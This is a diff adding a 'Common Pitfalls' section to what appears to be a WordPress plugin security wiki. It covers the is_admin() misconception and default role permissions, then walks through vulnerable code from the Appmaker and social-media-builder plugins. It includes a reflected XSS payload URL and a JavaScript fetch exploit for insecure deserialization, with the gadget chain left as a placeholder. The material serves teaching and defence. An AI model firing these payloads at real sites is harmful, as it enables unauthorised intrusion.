@@ -192,4 +192,144 @@ GET /wp-login.php?action=resetpass&key=$USER_ACTIVATION_KEY&login=admin HTTP/1.1
 Host: localhost:1337
 ```
 
+### Common Pitfalls
+
+Some easy mistakes to make when writing custom WordPress plugins. This ranges from unintuitive behaviour to some previous CVEs in other plugins.
+
+#### `is_admin()` as privilege check
+
+Functions like [`current_user_can`](https://developer.wordpress.org/reference/functions/current\_user\_can/) should be used to check the permissions of the currently logged-in user. A developer who doesn't fully read the documentation may encounter the [`is_admin()`](https://developer.wordpress.org/reference/functions/is\_admin/) function that sounds like it _should_ check if the current user is an administrator.\
+However, this is not the case! It instead checks if the _current path_ is to an administrator page. Any user can make a request to `/wp-admin/`, the `/wp-admin/admin-ajax.php` handler for example triggers this too.
+
+{% embed url="https://wordfence.com/learn/how-to-prevent-authentication-bypass-attacks/" %}
+Explaining the `is_admin()` confusion
+{% endembed %}
+
+Below is a list of all default **permissions per role** for reference:
+
+1. **Super Admin**
+   * Complete Control of **Multi-Site Networks**
+2. **Admin**
+   * Change **Themes**
+   * Add and Remove **Widgets** from Sidebar
+   * Activate and Deactivate **Plugins**
+   * **Add** and **Remove** _Other Users_
+   * Change **Roles** of _Other Users_
+3. **Editor**
+   * Edit, Delete, or Approve **Comments**
+   * Add, Edit or Delete **Tags**
+   * Add, Edit, or Delete **Categories**
+   * Add and Remove **Links**
+   * Edit or Delete Published **Posts** by _Any User_
+   * Write _Own_ **Page**s
+   * Edit or Delete Published **Pages** by _Any User_
+   * Edit or Delete **Media** Files
+4. **Author**
+   * Upload **Media** Files
+5. **Contributor**
+   * View **Comments**
+   * Write _Own_ **Posts**
+   * Edit _Own_ **Posts**
+6. **Subscriber**
+   * Edit _Own_ **Profile**
+
+#### [cross-site-scripting-xss.md](../../web/cross-site-scripting-xss.md "mention") in Appmaker
+
+A **Reflected XSS** vulnerability was reported in Appmaker <= 1.36.12 ([details](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/appmaker-woocommerce-mobile-app-manager/appmaker-convert-woocommerce-to-android-ios-native-mobile-apps-13612-reflected-cross-site-scripting)). One of its files looks like this, with a vulnerability in the `hook_payment_footer()` method:
+
+<pre class="language-php" data-title="class-appmaker-wc-general-hooks.php"><code class="lang-php">class APPMAKER_WC_General_hooks {
+    public function __construct() {
+        ...
+        if ( ! empty( $_GET['payment_from_app'] ) ) {
+            add_action( 'wp_head', array( $this, 'hook_stripe_enable_headers' ) );
+<strong>            add_action( 'wp_footer', array( $this, 'hook_payment_footer' ) );
+</strong>        }
+    }
+    ...
+    public function hook_payment_footer() {
+<strong>        $gateway = isset( $_GET['payment_gateway'] ) ? $_GET['payment_gateway'] : '';
+</strong>        $output  = '
+                &#x3C;script type="text/javascript">
+                window.onload = function() { 
+                    setTimeout(function(){
+                ';
+        if ( ! empty( $gateway ) ) {
+<strong>            $output .= "\n\t\t" . 'document.getElementById("payment_method_' . $gateway . '").checked = true;';
+</strong>            $output .= "\n\t\t" . 'document.getElementById("payment_method_' . $gateway . '").click();';
+        }
+        
+new APPMAKER_WC_General_hooks();
+</code></pre>
+
+The `?payment_gateway=` parameter is placed directly into the DOM here. It is easily abused by closing the script tag, and then opening a new one with malicious JavaScript. This works from any page as the footer is always loaded.
+
+<pre class="language-php" data-title="plugin.php"><code class="lang-php">class APPMAKER_WC {
+    ...
+        public static function init() {
+		...
+                // Unconditionally loads this class
+<strong>		require_once dirname( __FILE__ ) . '/lib/class-appmaker-wc-general-hooks.php';
+</strong>
+
+<strong>add_action( 'plugins_loaded', array( 'APPMAKER_WC', 'init' ) );
+</strong></code></pre>
+
+{% code title="Payload" overflow="wrap" %}
+```url
+/?payment_from_app=1&payment_gateway=</script><img%20src%20onerror=alert(origin)>
+```
+{% endcode %}
+
+#### Insecure Deserialization in Social Media Share Buttons
+
+The [social-media-builder](https://wordpress.org/plugins/social-media-builder/) plugin is no longer available for download due to a "Security Issue". It turns out that this is an **authenticated Insecure Deserialization** vulnerability. When calling the `import_buttons` action, the following code is triggered:
+
+<pre class="language-php"><code class="lang-php">class SGMBButton
+{
+	public $id;
+	public $title;
+	public $options = array();
+
+	public function init()
+	{
+            ...
+            //! This can be accessed from any authenticated user
+<strong>            add_action('wp_ajax_import_buttons', array($this,'importButtons'));
+</strong>	}
+    
+...
+
+public function importButtons()
+{
+    global $wpdb;
+<strong>    $url = $_POST['attachmentUrl'];
+</strong><strong>    $contents = unserialize(file_get_contents($url));
+</strong>    foreach ($contents as $content) {
+        $title = $content->title;
+        $options = $content->options;
+        $sql = $wpdb->prepare("INSERT INTO ".$wpdb->prefix.'sgmb_widget'."(title, options) VALUES (%s, %s)", $title, $options);
+        $res = $wpdb->query($sql);
+        echo 'MainRes: '.$res;
+    }
+}
+</code></pre>
+
+A URL inside `?attachmentUrl=` is fetched and unserialized. If the server allows it, you can use a `data:` URI with base64 to return arbitrary content to be deserialized. A JavaScript snippet that triggers this is below:
+
+{% code title="Exploit" %}
+```javascript
+const payload = `INSERT_DESERIALIZATION_EXPLOIT_HERE`;
+
+fetch("/wp-admin/admin-ajax.php?action=import_buttons", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  body: "attachmentUrl=data://text/plain;base64," + btoa(payload),
+});
+```
+{% endcode %}
+
+Replace `INSERT_DESERIALIZATION_EXPLOIT_HERE` with a PHP deserialization gadget chain that may require other outdated libraries or custom code.
+
 [^1]: "nopriv" here implies unauthenticated&#x20;
